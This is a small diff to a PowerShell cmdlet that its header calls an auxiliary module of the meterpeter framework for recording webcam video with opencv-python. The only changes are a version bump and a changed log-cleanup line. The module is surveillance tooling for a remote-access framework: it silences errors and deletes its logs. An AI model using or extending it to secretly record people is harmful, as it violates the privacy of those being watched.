@@ -7,7 +7,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: python3 {opencv-python}
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.4
+   PS cmdlet Dev version: v1.0.5
 
 .DESCRIPTION
    Auxiliary Module of meterpeter v2.10.12 that uses opencv-python to record
@@ -73,7 +73,7 @@
 )
 
 
-$cmdletver = "v1.0.4"
+$cmdletver = "v1.0.5"
 $StartPath = (Get-Location).Path
 $ErrorActionPreference = "SilentlyContinue"
 $host.UI.RawUI.WindowTitle = "@Invoke-WebCamAvi $cmdletver"
@@ -123,7 +123,7 @@ If($Force -ieq "false")
 }
 
 #Cleanup
-Remove-Item -Path "opencv.log" -Force
+Remove-Item -Path "pyver.log" -Force
 Remove-Item -Path "opencv.log" -Force
 
 If(Test-Path -Path "$WorkingDir\outpy.avi")
